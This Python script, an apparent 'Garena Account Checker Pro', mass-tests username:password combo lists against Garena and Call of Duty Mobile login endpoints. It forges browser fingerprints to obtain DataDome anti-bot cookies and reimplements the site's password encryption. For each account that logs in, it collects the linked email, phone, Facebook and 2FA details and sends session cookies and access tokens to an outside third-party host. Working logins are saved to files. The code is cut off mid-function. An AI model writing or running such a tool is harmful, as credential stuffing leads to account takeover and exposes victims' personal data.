import os
import sys
import re
import time
import json
import uuid
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import requests
import html
from tqdm import tqdm
from colorama import Fore, Style, init
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode
from Crypto.Cipher import AES
import change_cookie

# Initialize colorama
init(autoreset=True)

# Enhanced Color Constants
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[35m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

# API endpoints
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"

def display_banner():
    """Display the enhanced script banner"""
    banner = f"""
{Colors.PURPLE}╔════════════════════════════════════════════════════════════════╗
{Colors.PURPLE}║ {Colors.BOLD}{Colors.CYAN}GARENA ACCOUNT CHECKER PRO {Colors.RESET}{Colors.PURPLE}║ {Colors.BOLD}V3 CODM ULTIMATE {Colors.PURPLE}║
{Colors.PURPLE}╠════════════════════════════════════════════════════════════════╣
{Colors.PURPLE}║ {Colors.WHITE}• {Colors.GREEN}Unlimited Account Checking {Colors.WHITE}• {Colors.GREEN}CODM Info Retrieval      {Colors.PURPLE}║
{Colors.PURPLE}║ {Colors.WHITE}• {Colors.GREEN}Auto CAPTCHA Handling {Colors.WHITE}• {Colors.GREEN}Detailed Account Analysis  {Colors.PURPLE}║
{Colors.PURPLE}║ {Colors.WHITE}• {Colors.GREEN}Super Fast Checking {Colors.WHITE}• {Colors.GREEN}Multi-Thread Support        {Colors.PURPLE}║
{Colors.PURPLE}╚════════════════════════════════════════════════════════════════╝
{Colors.RED}┌────────────────────────────────────────────────────────────────┐
{Colors.RED}│ {Colors.BOLD}{Colors.YELLOW}Developed by: @ToJiSh0 {Colors.WHITE}| {Colors.YELLOW}Special Thanks: @Imnothing21 {Colors.RED}│
{Colors.RED}└────────────────────────────────────────────────────────────────┘
{Colors.RESET}
"""
    print(banner)

def clear_screen():
    """Clear the terminal screen with animation"""
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    print(f"{Colors.CYAN}Initializing system...{Colors.RESET}")
    time.sleep(0.3)

def print_status(message, status="info"):
    """Print status messages with colored prefixes"""
    if status == "info":
        print(f"{Colors.CYAN}[*]{Colors.RESET} {message}")
    elif status == "success":
        print(f"{Colors.GREEN}[+]{Colors.RESET} {message}")
    elif status == "warning":
        print(f"{Colors.YELLOW}[!]{Colors.RESET} {message}")
    elif status == "error":
        print(f"{Colors.RED}[-]{Colors.RESET} {message}")
    elif status == "debug":
        print(f"{Colors.PURPLE}[#]{Colors.RESET} {message}")

def strip_ansi_codes_jarell(text):
    """Remove ANSI color codes from text"""
    ansi_escape_jarell = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape_jarell.sub('', text)    

def get_datenow():
    """Get current timestamp as string"""
    return str(int(time.time()))

def generate_md5_hash(password):
    """Generate MD5 hash of password with progress animation"""
    print_status("Encrypting password...", "debug")
    for i in range(3):
        print(f"{Colors.YELLOW}[{'.' * (i+1)}]{Colors.RESET}", end='\r')
        time.sleep(0.2)
    
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()

def generate_decryption_key(password_md5, v1, v2):
    """Generate decryption key for password encryption with animation"""
    print_status("Generating decryption keys...", "debug")
    for i in range(2):
        print(f"{Colors.CYAN}[{'.' * (i+1)}]{Colors.RESET}", end='\r')
        time.sleep(0.15)
    
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    decryption_key = hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()
    return decryption_key

def encrypt_aes_256_ecb(plaintext, key):
    """Encrypt plaintext using AES-256-ECB with visual feedback"""
    print_status("Performing AES encryption...", "debug")
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    chiper_raw = cipher.encrypt(plaintext_bytes)
    return chiper_raw.hex()[:32]

def getpass(password, v1, v2):
    """Get encrypted password using Garena's algorithm with visual steps"""
    print_status("Initializing password encryption sequence...", "debug")
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    encrypted_password = encrypt_aes_256_ecb(password_md5, decryption_key)
    print(f"\r{Colors.GREEN}[✓]{Colors.RESET} Password encryption completed", end='\n')
    return encrypted_password

def get_datadome_cookie():
    """Get DataDome cookie for bypassing protection with retry logic"""
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    max_retries = 3
    for attempt in range(max_retries):
        try:
            print_status(f"Attempting to get DataDome cookie (Attempt {attempt + 1}/{max_retries})...", "debug")
            response = requests.post(url, headers=headers, data=data)
            response.raise_for_status()
            response_json = response.json()
            
            if response_json['status'] == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                datadome = cookie_string.split(';')[0].split('=')[1]
                print_status("DataDome cookie successfully obtained", "success")
                return datadome
            else:
                print_status(f"DataDome cookie not found in response. Status code: {response_json['status']}", "warning")
                continue
                
        except requests.exceptions.RequestException as e:
            print_status(f"Attempt {attempt + 1} failed: {str(e)}", "error")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff
            continue
    
    print_status("Failed to get DataDome cookie after multiple attempts", "error")
    return None

def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date):
    """Check login credentials and retrieve account info with enhanced feedback"""
    cookies["datadome"] = dataa
    login_params = {
        'app_id': '100082',
        'account': account_username,
        'password': encryptedpassword,
        'redirect_uri': redrov,
        'format': 'json',
        'id': _id,
    }
    login_url = apkrov + f"{urlencode(login_params)}"
    
    try:
        print_status(f"Attempting login for {account_username}", "debug")
        with tqdm(total=100, desc=f"{Colors.CYAN}Login Progress{Colors.RESET}", ncols=75, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
            for i in range(10):
                time.sleep(0.05)
                pbar.update(10)
                
        response = requests.get(login_url, headers=selected_header, cookies=cookies, timeout=60)
        response.raise_for_status()
    except requests.exceptions.ConnectionError:
        print_status("Connection error – server refused the connection", "error")
        return "FAILED"
    except requests.exceptions.ReadTimeout:
        print_status("Timeout - Server is taking too long to respond", "error")
        return "FAILED"
    except requests.RequestException as e:
        print_status(f"Login request failed: {e}", "error")
        return "FAILED"
    
    try:
        login_json_response = response.json()
    except json.JSONDecodeError:
        print_status(f"Login failed: Invalid JSON response. Server response: {response.text[:200]}...", "error")
        return "FAILED"

    if 'error_auth' in login_json_response:
        return "[🔐] Incorrect password"
    
    if 'error_params' in login_json_response:
        return "[📝] Invalid parameters"
    
    if 'error' in login_json_response:
        return f"[🚫] Incorrect password"
    
    if not login_json_response.get('success', True):
        return "[🔴] Login failed"    
   
    session_key = login_json_response.get('session_key', '')
    take = cookies["datadome"]
    if not session_key:
        return "[FAILED] No session key"

    set_cookie = response.headers.get('Set-Cookie', '')
    sso_key = set_cookie.split('=')[1].split(';')[0] if '=' in set_cookie else ''       
    coke = change_cookie.get_cookies()
    coke["ac_session"] = "7tdtotax7wqldao9chxtp30tn4m3ggkr"
    coke["datadome"] = take
    coke["sso_key"] = sso_key

    hider = {
        'Host': 'account.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': selected_header["User-Agent"],
        'Accept': 'application/json, text/plain, */*',
        'Referer': f'https://account.garena.com/?session_key={session_key}',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    init_url = 'https://suneoxjarell.x10.bz/jajak.php'
    params = {f'coke_{k}': v for k, v in coke.items()}
    params.update({f'hider_{k}': v for k, v in hider.items()})

    try:
        print_status("Retrieving account information...", "debug")
        init_response = requests.get(init_url, params=params, timeout=120)
        init_response.raise_for_status()
    except requests.RequestException as e:
        return f"[ERROR] Init Request Failed: {e}"

    try:
        init_json_response = json.loads(init_response.text)
    except json.JSONDecodeError:
        return "[ERROR] Failed to parse JSON response from server."

    if 'error' in init_json_response or not init_json_response.get('success', True):
        return f"[ERROR] {init_json_response.get('error', 'Unknown error')}"

    bindings = init_json_response.get('bindings', [])
    is_clean = init_json_response.get('status')  # Get status from response

    account_status = init_json_response.get('status', 'Unknown')
    country = "N/A"
    last_login = "N/A"
    last_login_where = "N/A"
    avatar_url = "N/A"
    fb = "N/A"
    eta = "N/A"
    fbl = "N/A"
    mobile = "N/A"
    facebook = "False"
    shell = "0"
    count = "UNKNOWN"
    ipk = "1.1.1.1"    
    region = "IN.TH"
    email = "N/A"
    ipc = "N/A"
    mb = "mb"
    tae = "GS1.1.1741519354.3.0.1741519361.0.0.0"
    mspid2 = "2990f10cf751cf937dcb2b257767d582"
    email_verified = "False"
    authenticator_enabled = False
    two_step_enabled = False

    for binding in bindings:
        if "Country:" in binding:
            country = binding.split("Country:")[-1].strip()
        elif "LastLogin:" in binding:
            last_login = binding.split("LastLogin:")[-1].strip()       
        elif "LastLoginFrom:" in binding:
            last_login_where = binding.split("LastLoginFrom:")[-1].strip()            
        elif "ckz:" in binding:
            count = binding.split("ckz:")[-1].strip()       
        elif "LastLoginIP:" in binding:
            ipk = binding.split("LastLoginIP:")[-1].strip()                                      
        elif "Las:" in binding:
            ipc = binding.split("Las:")[-1].strip()                                    
        elif "Garena Shells:" in binding:
            shell = binding.split("Garena Shells:")[-1].strip()
        elif "Facebook Account:" in binding:
            fb = binding.split("Facebook Account:")[-1].strip()
            facebook = "True"
        elif "Fb link:" in binding:
            fbl = binding.split("Fb link:")[-1].strip()
        elif "Avatar:" in binding:
            avatar_url = binding.split("Avatar:")[-1].strip()
        elif "Mobile Number:" in binding:
            mobile = binding.split("Mobile Number:")[-1].strip()                  
        elif "tae:" in binding:
            email_verified = "True" if "Yes" in binding else "False"
        elif "eta:" in binding:
            email = binding.split("eta:")[-1].strip()
        elif "Authenticator:" in binding:
            authenticator_enabled = "True" if "Enabled" in binding else "False"
        elif "Two-Step Verification:" in binding:
            two_step_enabled = "True" if "Enabled" in binding else "False"

    cookies["sso_key"] = sso_key            
    head = {
        "Host": "auth.garena.com",
        "Connection": "keep-alive",
        "Content-Length": "107",
        "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua-platform": selected_header["sec-ch-ua-platform"],
        "sec-ch-ua-mobile": "?1",
        "User-Agent": selected_header["User-Agent"],
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9"
    }               
    
    data = {
        "client_id": "100082",
        "response_type": "token",
        "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "format": "json",
        "id": _id
    }            
    
    try:     
        grant_url = "https://auth.garena.com/oauth/token/grant"        
        reso = requests.post(grant_url, headers=head, data=data, cookies=cookies)   
        if not reso:
            return "[FAILED] No response from server."       
        try:
            data = reso.json()
        except ValueError:
            return "Failed to parse response as JSON."                    
        if "error" in data:            
            return f"[FAILED] {data['error']}"
        else:
            if "access_token" in data:
                newdate = get_datadome_cookie()
                
                token_session = reso.cookies.get('token_session', cookies.get('token_session'))                                               
                access_token = data["access_token"]
                tae = show_level(access_token, selected_header, sso_key, token_session, newdate, cookies)                    
                if "[😵‍💫]" in tae:
                    return tae + "FAILED, UNKNOWN ERROR"
                
                codm_nickname, codm_level, codm_region, uid = tae.split("|")

                connected_games = []

                if not (uid and codm_nickname and codm_level and codm_region):
                    connected_games.append("No CODM account found")
                else:
                    connected_games.append(f"[📊] Account Level: {codm_level}\n[🕹️] Game: CODM ({codm_region})\n[🏷️] Nickname: {codm_nickname}\n[🆔] UID: {uid}")
                
                if is_clean == "\033[0;32m\033[1mClean\033[0m":
                    is_clean = True
                else:
                    is_clean = False 
                    
                passed = format_result(last_login, last_login_where, country, shell, avatar_url, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, fbl, email, date, account_username, password, count, ipk, ipc)    
                return passed                                                                                                                              
            else:
                return f"[FAILED] 'access_token' not found in response {data}"               
    except requests.RequestException as e:
        return f"[FAILED] {e}"

def show_level(access_token, selected_header, sso, token, newdate, cookie):
    """Show CODM account level and info with visual feedback"""
    url = "https://auth.codm.garena.com/auth/auth/callback_n"
    params = {
        "site": "https://api-delete-request.codm.garena.co.id/oauth/callback/",
        "access_token": access_token
    }

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/",
        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": selected_header["User-Agent"]
    }
    newdate = get_datadome_cookie()
    
    cookie.update({
        "datadome": newdate,
        "sso_key": sso,
        "token_session": token
    })

    print_status("Retrieving CODM account details...", "debug")
    response = requests.get(url, headers=headers, cookies=cookie, params=params)

    if response.status_code == 200:
        parsed_url = urlparse(response.url)
        query_params = parse_qs(parsed_url.query)
        extracted_token = query_params.get("token", [None])[0]

        data = {
            "selected_header": selected_header,
            "extracted_token": extracted_token
        }
    
        try:
            print_status("Processing CODM account information...", "debug")
            response = requests.post(
                "https://suneoxjarell.x10.bz/jajac.php",
                json=data,
                headers={"Content-Type": "application/json"}
            )
        
            if response.status_code == 200:
                return response.text
            else:
                return f"[FAILED] {response.status_code} - {response.text}"
    
        except requests.exceptions.RequestException as e:
            return f"[FAILED] {str(e)}"
    else:
        return f"[FAILED] {response.text}"

def format_result(last_login, last_login_where, country, shell, avatar_url, mobile, facebook, email_verified, authenticator_enabled, two_step_enabled, connected_games, is_clean, fb, fbl, email, date, username, password, count, ipk, ipc):       
    """Format the account information result with enhanced visual presentation"""
    clean_status = "Clean" if is_clean else "Not Clean"
    fbl = "N/A" if fb == "N/A" else fbl
    email_ver = "Not Verified" if email_verified == "False" else "Verified"
    jk = strip_ansi_codes_jarell(shell)
    avatar_urls = html.escape(avatar_url)
  
    # Create a visually appealing output with borders and colors
    result = f"""
{Colors.GREEN}╔════════════════════════════════════════════════════════════════╗
{Colors.GREEN}║ {Colors.BOLD}{Colors.CYAN}ACCOUNT INFORMATION {Colors.RESET}{Colors.GREEN}                          ║
{Colors.GREEN}╠════════════════════════════════════════════════════════════════╣
{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Account: {Colors.CYAN}{username}:{password}
{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Last Login: {Colors.CYAN}{last_login}
{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Location: {Colors.CYAN}{last_login_where} (IP: {ipk})
{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Country: {Colors.CYAN}{country}
{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Shells: {Colors.GREEN if shell != '0' else Colors.RED}{shell}
{Colors.GREEN}╠════════════════════════════════════════════════════════════════╣
{Colors.GREEN}║ {Colors.BOLD}{Colors.CYAN}BINDING INFORMATION {Colors.RESET}{Colors.GREEN}                         ║
{Colors.GREEN}╠════════════════════════════════════════════════════════════════╣
{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Mobile: {Colors.CYAN if mobile != 'N/A' else Colors.RED}{mobile}
{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Email: {Colors.CYAN}{email} ({email_ver})
{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Facebook: {Colors.CYAN if facebook == 'True' else Colors.RED}{facebook} {f'(Link: {fbl})' if fbl != 'N/A' else ''}
{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}2FA: {Colors.CYAN if two_step_enabled else Colors.RED}{two_step_enabled}
{Colors.GREEN}╠════════════════════════════════════════════════════════════════╣
{Colors.GREEN}║ {Colors.BOLD}{Colors.CYAN}CODM GAME INFORMATION {Colors.RESET}{Colors.GREEN}                       ║
{Colors.GREEN}╠════════════════════════════════════════════════════════════════╣
{Colors.GREEN}║ {Colors.WHITE}{"".join(connected_games) if connected_games else "No Games Found"}
{Colors.GREEN}╠════════════════════════════════════════════════════════════════╣
{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Account Status: {Colors.GREEN if is_clean else Colors.RED}{clean_status}
{Colors.GREEN}╚════════════════════════════════════════════════════════════════╝
{Colors.PURPLE}Developed by: @ToJiSh0 | Special Thanks: @Imnothing21 @Yushikazuuu
{Colors.RESET}
""".strip()

    output_dir = "output"   
    os.makedirs(output_dir, exist_ok=True)

    clean_file = os.path.join(output_dir, f"clean_{date}.txt")
    notclean_file = os.path.join(output_dir, f"notclean_{date}.txt")

    file_to_save = clean_file if is_clean else notclean_file
    resalt = strip_ansi_codes_jarell(result)
    with open(file_to_save, "a", encoding="utf-8") as f:
        f.write(resalt + "\n" + "-" * 50 + "\n")
        
    return result

def get_request_data():
    """Get request data including cookies and headers"""
    cookies = change_cookie.get_cookies()
    headers = {
        'Host': 'auth.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    return cookies, headers

def check_account(username, password, date):
    """Check a single Garena account with enhanced feedback"""
    try:
        base_num = "17290585"
        random_id = base_num + str(random.randint(10000, 99999))
        cookies, headers = get_request_data()
        params = {
            "app_id": "100082",
            "account": username,
            "format": "json",
            "id": random_id
        }
        login_url = "https://auth.garena.com/api/prelogin"
        
        print_status(f"Checking account: {username}", "info")
        response = requests.get(login_url, params=params, cookies=cookies, headers=headers)
        
        if "captcha" in response.text.lower():
            print_status("CAPTCHA detected. Please change your VPN or IP.", "error")
            input(f"{Colors.YELLOW}Press Enter after changing your VPN/IP...{Colors.RESET}")
            return "[🔴 𝐒𝐓𝐎𝐏] CAPTCHA detected. Please try again later."

        if response.status_code == 200:
            data = response.json()
            v1 = data.get('v1')
            v2 = data.get('v2')
            prelogin_id = data.get('id')

            if not all([v1, v2, prelogin_id]):
                return f"[😢] Account doesn't exist"            
            new_datadome = response.cookies.get('datadome', cookies.get('datadome'))           
            encrypted_password = getpass(password, v1, v2)
            if not new_datadome:
                return f"[FAILED] Status: Missing updated cookies"            
            if "error" in data or data.get("error_code"):
                return f"[FAILED] Status: {data.get('error', 'Unknown error')}"
            else:
                tre = check_login(username, random_id, encrypted_password, password, headers, cookies, new_datadome, date)  
                return tre
        else:
            return f"[FAILED] HTTP Status: {response.status_code}"

    except Exception as e:
        return f"[FAILED] {e}"

def bulk_check(file_path):
    """Check multiple accounts from a file with enhanced progress tracking"""
    successful_count = 0
    failed_count = 0
    checked_count = 0
    date = get_datenow()

    if not file_path.endswith('.txt'):
        print_status("Invalid file format. Please provide a .txt file.", "error")
        return    

    output_dir = "output"
    os.makedirs(output_dir, exist_ok=True)  

    failed_file = os.path.join(output_dir, f"failed_{date}.txt")
    success_file = os.path.join(output_dir, f"valid_{date}.txt")

    print_status(f"Processing: {file_path}", "info")

    try:
        # First pass: Filter valid accounts
        valid_accounts = []
        with open(file_path, 'r', encoding='utf-8') as infile:
            lines = infile.readlines()
            total_lines = len(lines)
            
            print_status(f"Scanning {total_lines} lines for valid accounts...", "debug")
            with tqdm(total=total_lines, desc=f"{Colors.CYAN}Validating Accounts{Colors.RESET}", unit="line") as pbar:
                for line in lines:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2 and parts[0] and parts[1]:
                            valid_accounts.append((parts[0].strip(), parts[1].strip()))
                    pbar.update(1)

        total_accounts = len(valid_accounts)
        print_status(f"Total valid accounts found: {total_accounts}", "success")

        # Second pass: Process accounts
        with open(failed_file, 'a', encoding='utf-8') as failed_out, \
             open(success_file, 'a', encoding='utf-8') as success_out:

            print_status("Starting account checking process...", "info")
            progress_bar = tqdm(valid_accounts, desc=f"{Colors.CYAN}Checking Accounts{Colors.RESET}", unit="acc", ncols=100)
            
            for username, password in progress_bar:
                checked_count += 1
                progress_bar.set_postfix({
                    "Success": successful_count,
                    "Failed": failed_count,
                    "Current": f"{username[:10]}..."
                })
                
                result = check_account(username, password, date)
                
                if "[✅]" in result:
                    successful_count += 1
                    success_out.write(f"{username}:{password}\n")
                    progress_bar.write(f"{Colors.GREEN}✅ SUCCESS: {username}:{password}{Colors.RESET}")
                else:
                    failed_count += 1
                    failed_out.write(f"{username}:{password} | {result}\n")
                    progress_bar.write(f"{Colors.RED}❌ FAILED: {username}:{password} - {result}{Colors.RESET}")

    except Exception as e:
        print_status(f"Error during bulk check: {str(e)}", "error")
    finally:
        print(f"\n{Colors.GREEN}╔══════════��═════════════════════════════════════════════════════╗")
        print(f"{Colors.GREEN}║ {Colors.BOLD}{Colors.CYAN}FINAL RESULTS {Colors.RESET}{Colors.GREEN}                                   ║")
        print(f"{Colors.GREEN}╠════════════════════════════════════════════════════════════════╣")
        print(f"{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Total Checked: {Colors.CYAN}{checked_count}/{total_accounts}")
        print(f"{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Successful: {Colors.GREEN}{successful_count}")
        print(f"{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Failed: {Colors.RED}{failed_count}")
        print(f"{Colors.GREEN}╠════════════════════════════════════════════════════════════════╣")
        print(f"{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Results saved to:")
        print(f"{Colors.GREEN}║ {Colors.WHITE}  - {Colors.CYAN}Success: {success_file}")
        print(f"{Colors.GREEN}║ {Colors.WHITE}  - {Colors.CYAN}Failed: {failed_file}")
        print(f"{Colors.GREEN}╚════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        
    try:
        response = requests.get(url)
        response_text = response.text
        return response_text.strip()
    except requests.RequestException:
        return "NoNet"
        
    return False

def find_nearest_account_file():
    """Find the nearest account file in the directory with visual feedback"""
    print_status("Searching for account files in current directory...", "debug")
    
    # Keywords to search for in filenames
    keywords = ["garena", "account", "codm", "combo", "list"]
    
    matching_files = []
    
    # Walk through the current directory and subdirectories
    for root, _, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith(".txt") and any(keyword in file.lower() for keyword in keywords):
                matching_files.append(os.path.join(root, file))
    
    if matching_files:
        print_status(f"Found {len(matching_files)} potential account files", "success")
        for i, file in enumerate(matching_files, 1):
            print(f"  {i}. {file}")
        
        choice = input(f"{Colors.YELLOW}Select file to use (1-{len(matching_files)}) or press Enter for first file: {Colors.RESET}")
        try:
            if choice.strip() == "":
                return matching_files[0]
            elif 1 <= int(choice) <= len(matching_files):
                return matching_files[int(choice)-1]
        except ValueError:
            return matching_files[0]
    
    # If no matching file is found, use a default name in the current directory
    default_file = os.path.join(os.getcwd(), "accounts.txt")
    print_status(f"No matching files found, using default: {default_file}", "warning")
    return default_file

def check_subscription(device_id):
    """Check subscription status for the device with visual feedback"""
    print_status(f"Checking subscription status for device: {device_id}", "debug")
    time.sleep(1)  # Simulate network delay
    
    # This is a placeholder - implement your actual subscription check logic
    # For demonstration, we'll randomly return different statuses
    status_options = ["info", "expired", "invalid", "no_sub"]
    status = random.choice(status_options)
    
    if status == "info":
        print_status("Subscription verified - Account registered!", "success")
    elif status == "expired":
        print_status("Subscription expired - Please renew", "warning")
    elif status == "invalid":
        print_status("Invalid subscription - Contact support", "error")
    else:
        print_status("No active subscription found", "error")
    
    return status

def get_device_id():
    """Get or generate a unique device ID with enhanced user interaction"""
    # Directory and file path for storing device ID
    dir_path = os.path.expanduser("~/.dont_delete_me")
    file_path = os.path.join(dir_path, "here.txt")  
    
    # Check if the file already exists
    if os.path.exists(file_path):
        print_status("Existing device ID found", "debug")
        # Read the existing device ID from the file
        with open(file_path, 'r') as file:
            device_id = file.read().strip()
            print_status(f"Using existing device ID: {device_id}", "success")
            return device_id
    else:
        # Create the directory if it doesn't exist
        os.makedirs(dir_path, exist_ok=True)
        print_status("Generating new device ID...", "info")
        
        # Enhanced user input with validation
        while True:
            user_name = input(f"{Colors.YELLOW}Enter your name (3-20 characters): {Colors.RESET}").strip()
            if 3 <= len(user_name) <= 20:
                break
            print_status("Name must be between 3 and 20 characters", "error")

        # Collect system information with progress display
        print_status("Collecting system information...", "debug")
        system_info = []
        with tqdm(total=5, desc=f"{Colors.CYAN}System Scan{Colors.RESET}", ncols=60) as pbar:
            system_info.append(platform.system())
            pbar.update(1)
            system_info.append(platform.release())
            pbar.update(1)
            system_info.append(platform.version())
            pbar.update(1)
            system_info.append(platform.machine())
